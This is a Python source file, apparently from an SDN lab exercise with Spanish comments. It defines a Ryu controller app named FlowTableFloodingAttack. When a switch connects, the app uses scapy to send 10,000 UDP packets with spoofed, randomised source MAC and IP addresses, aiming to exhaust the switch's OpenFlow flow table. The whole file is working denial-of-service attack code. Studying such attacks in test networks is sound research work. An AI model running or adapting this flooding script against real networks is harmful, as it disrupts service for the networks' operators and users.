from ryu.base import app_manager
from ryu.controller import ofp_event
from ryu.controller.handler import MAIN_DISPATCHER, set_ev_cls
from ryu.ofproto import ofproto_v1_3
from scapy.all import sendp, Ether, IP, UDP
import random

class FlowTableFloodingAttack(app_manager.RyuApp):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]

    def __init__(self, *args, **kwargs):
        super(FlowTableFloodingAttack, self).__init__(*args, **kwargs)
        self.mac_src = '00:00:00:00:00:01'
        self.ip_src = '10.0.0.1'
        # Lista de direcciones de destino para variar los flujos
        self.mac_dsts = ['00:00:00:00:00:02', '00:00:00:00:00:03', 
                         '00:00:00:00:00:04', '00:00:00:00:00:05']
        self.ip_dsts = ['10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5']
        
    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, MAIN_DISPATCHER)
    def switch_features_handler(self, ev):
        self.logger.info("Flooding the flow table with random packets")
        self.flood_flow_table()

    def flood_flow_table(self):
        for i in range(10000):  # Enviar 10,000 paquetes con diferentes direcciones IP y MAC
            random_mac_src = self.random_mac()
            random_mac_dst = random.choice(self.mac_dsts)
            random_ip_src = self.random_ip()
            random_ip_dst = random.choice(self.ip_dsts)

            pkt = Ether(src=random_mac_src, dst=random_mac_dst) / \
                  IP(src=random_ip_src, dst=random_ip_dst) / \
                  UDP(sport=12345, dport=80)

            # Log para mostrar el paquete enviado
            self.logger.info(f"Enviando paquete {i+1}: MAC src={random_mac_src}, MAC dst={random_mac_dst}, "
                             f"IP src={random_ip_src}, IP dst={random_ip_dst}")

            # Envía el paquete; revisa que "h1-eth0" sea la interfaz correcta
            sendp(pkt, iface="h1-eth0", verbose=False)

    def random_mac(self):
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def random_ip(self):
        return "10.0.%d.%d" % (random.randint(1, 254), random.randint(1, 254))
